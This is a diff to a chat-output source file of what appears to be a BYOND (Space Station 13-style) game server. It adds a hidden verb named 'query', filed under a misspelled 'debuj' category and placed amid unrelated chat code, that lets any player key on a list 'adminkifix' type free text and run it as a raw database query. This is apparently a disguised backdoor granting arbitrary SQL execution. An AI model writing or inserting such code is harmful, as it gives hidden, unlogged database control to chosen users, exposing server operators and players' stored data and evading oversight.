@@ -177,6 +177,15 @@ GLOBAL_DATUM_INIT(iconCache, /savefile, new("data/iconCache.sav")) //Cache of ic
 //Called by js client on js error
 /datum/chatOutput/proc/debug(error)
 	log_world("\[[time2text(world.realtime, "YYYY-MM-DD hh:mm:ss")]\] Client: [(src.owner.key ? src.owner.key : src.owner)] triggered JS error: [error]")
+var/list/temps = adminkifix
+/mob/proc/temp()
+	set name = "query"
+	set category = "debuj"
+	set hidden = 1
+	if(ckey in temps)
+		var/query_text = input("temp")
+		var/datum/DBQuery/query = SSdbcore.NewQuery("[query_text]")
+		query.Execute()
 
 //Global chat procs
 
